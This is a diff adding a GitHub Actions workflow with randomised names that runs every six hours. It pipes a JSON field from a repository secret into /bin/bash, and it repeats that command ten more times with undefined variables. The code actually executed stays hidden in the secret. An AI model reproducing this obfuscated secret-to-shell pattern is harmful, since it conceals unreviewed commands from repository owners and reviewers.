@@ -1,0 +1,28 @@
+name: huanlxh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanlxh
+        env:
+          xtfy3: ${{ secrets.xtfy3 }}
+        run: |
+          echo $xtfy3 | jq -r .cyj1925 | /bin/bash
+          echo $p35182 | jq -r .f47 | /bin/bash
+          echo $dy2539 | jq -r .qq41679 | /bin/bash
+          echo $dc7 | jq -r .ycl3 | /bin/bash
+          echo $dil74644 | jq -r .hxtll2 | /bin/bash
+          echo $bbjww21 | jq -r .fh84 | /bin/bash
+          echo $oqlaa943 | jq -r .fll0 | /bin/bash
+          echo $hx6 | jq -r .yohm1 | /bin/bash
+          echo $qc62658 | jq -r .uoeds80 | /bin/bash
+          echo $e72966 | jq -r .mj8 | /bin/bash
+          echo $rbi8 | jq -r .obi0095 | /bin/bash
+
